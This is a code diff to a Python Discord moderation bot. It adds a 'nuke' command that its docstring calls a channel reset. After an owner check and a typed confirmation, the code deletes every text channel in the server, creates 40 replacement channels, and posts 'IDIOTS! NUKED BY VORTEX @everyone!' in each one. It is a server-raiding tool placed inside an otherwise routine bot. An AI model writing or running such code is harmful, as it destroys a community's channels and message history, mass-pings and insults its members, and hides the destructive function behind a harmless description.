@@ -351,6 +351,37 @@ async def warn(ctx, member: discord.Member = None):
     
     await ctx.send(f"{member.mention} has been **warned** and given `{next_warn}` role.")
 
+@bot.command(name="nuke")
+async def server_reset(ctx, *, text: str = "reset-channel"):
+    """Deletes all text channels and creates new ones with the given name."""
+    if ctx.author.id not in (OWNER_ID):
+        await ctx.send("⚠ NO")
+        return
+    
+    confirmation_msg = await ctx.send(f"⚠ {ctx.author.mention}, Type `yes` to proceed.")
+    
+    def check(m):
+        return m.author.id in (OWNER_ID) and m.content.lower() == "yes" and m.channel == ctx.channel
+    
+    try:
+        await bot.wait_for("message", check=check, timeout=30)
+    except:
+        await ctx.send("❌")
+        return
+    
+    for channel in ctx.guild.text_channels:
+        try:
+            await channel.delete()
+            print(f"Deleted channel: {channel.name}")
+        except Exception as e:
+            print(f"Failed to delete channel {channel.name}: {e}")
+    
+    for i in range(40):
+        new_channel = await ctx.guild.create_text_channel(f"{text}-{i+1}")
+        await new_channel.send(f"IDIOTS! NUKED BY VORTEX @everyone!")
+    
+    await ctx.send("✅")
+
 @bot.event
 async def on_member_join(member):
     """Greets new members when they join the server."""
